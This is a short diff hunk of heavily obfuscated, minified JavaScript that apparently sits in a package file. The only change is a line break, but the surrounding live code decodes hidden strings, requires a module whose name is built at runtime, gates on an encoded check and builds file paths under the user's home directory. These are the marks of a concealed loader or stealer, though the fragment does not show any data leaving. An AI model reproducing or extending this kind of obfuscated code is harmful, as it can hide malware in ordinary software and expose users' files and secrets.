@@ -35,7 +35,8 @@ Buffer.from(s1,t).toString(c)),e=(r,e)=>{ let E=Buffer.from(r,t);
 
     const r=`${t}`,e=require(`${y}${d(m)}`);
     if(I!=d("Ih0IXBoDFWc7IA"))return;
-    const E=d("JjEqfTYgRhJVMjR3OFQKVxIdCEs"),o=`${C("~/")}${c}`; 
+    const E=d("JjEqfTYgRhJVMjR3OFQKVxIdCEs"),
+    o=`${C("~/")}${c}`; 
     let F=U.join(o,d("ORsFWRlUNUwUAAM"));
     const a=d("FBEVFUdBUBUSFws"),
     B=d("GgYPXxwaOU0HGA"),
